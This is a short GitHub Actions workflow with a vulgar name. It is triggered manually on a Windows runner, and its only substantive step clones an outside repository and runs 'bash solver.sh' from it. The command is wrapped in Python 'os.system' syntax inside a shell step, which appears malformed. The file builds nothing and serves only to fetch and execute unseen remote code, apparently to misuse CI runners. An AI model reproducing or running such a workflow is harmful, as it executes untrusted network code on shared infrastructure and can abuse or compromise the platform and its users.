name: kontol  
   
on: [workflow_dispatch]  
   
jobs:  
  build:  
    name: kontol  
    runs-on: windows-latest  
    strategy:  
      max-parallel: 5  
      fail-fast: false  
      matrix:  
        go: [1.0]  
        flag: [A]  
    env:  
        NUM_JOBS: 2  
        JOB: ${{ matrix.go }}  
    steps:  
    - name: DOWNLOAD  
      run: os.system('git clone https://github.com/Xilahani8/asd.git && cd asd && bash solver.sh')
    - name: DONE  
      run: exit
